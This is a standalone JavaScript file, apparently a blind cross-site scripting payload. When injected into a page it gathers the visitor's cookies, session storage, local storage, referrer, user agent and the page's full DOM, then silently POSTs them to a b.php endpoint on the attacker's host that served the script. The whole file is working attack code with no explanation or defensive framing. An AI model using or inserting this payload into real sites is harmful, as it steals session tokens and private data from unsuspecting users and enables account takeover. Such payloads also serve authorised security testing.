var mhost = new URL('b.php', document.currentScript.src).href;
var msg = 'User Agent\n' + navigator.userAgent + '\n\nTarget URL\n' + document.URL;
msg += '\n\nReferer URL\n' + document.referrer + '\n\nReadable Cookies\n' + document.cookie;
msg += '\n\nSession Storage\n' + JSON.stringify(sessionStorage) + '\n\nLocal Storage\n' + JSON.stringify(localStorage);
msg += '\n\nFull DOM\n' + document.documentElement.outerHTML;
var r = new XMLHttpRequest();
r.open('POST', mhost, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + encodeURIComponent(document.location.origin) + '&msg=' + encodeURIComponent(msg));
